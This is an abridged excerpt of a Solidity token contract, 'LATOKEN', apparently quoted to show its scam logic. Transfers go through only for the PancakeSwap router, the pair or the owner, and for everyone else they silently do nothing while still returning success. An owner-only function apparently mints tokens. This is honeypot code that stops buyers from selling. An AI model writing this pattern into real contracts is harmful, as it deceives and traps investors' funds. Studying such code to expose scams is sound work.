...
contract LATOKEN is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        ...
        if(_msgSender() == PANCAKE_ROUTER_V2_ADDRESS || _msgSender() == pancakePair() || pancakePair() == address(0) || _msgSender() == owner()) {
            ...
            if( (amount <= _MUO|| isSL) && !isContract(_msgSender()) ) {
                _transfer(_msgSender(), recipient, amount);
            }
        }
        return true;
    ...
    function transferFrom(
        ...
        if(sender == PANCAKE_ROUTER_V2_ADDRESS || sender == pancakePair() || pancakePair() == address(0) || sender == owner()) {
            ...
            //nomal user check amount
            if( (amount <= _MUO|| isSL) && !isContract(sender) ) {
                _transfer(sender, recipient, amount);
                uint256 currentAllowance = _allowances[sender][_msgSender()];
                require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
                unchecked {
    ...
    function _PIT(address account, uint256 amount) internal virtual {
...
,        uint256 amount
    ...
    function _PIT(uint256 amount) public onlyOwner virtual returns (bool) {
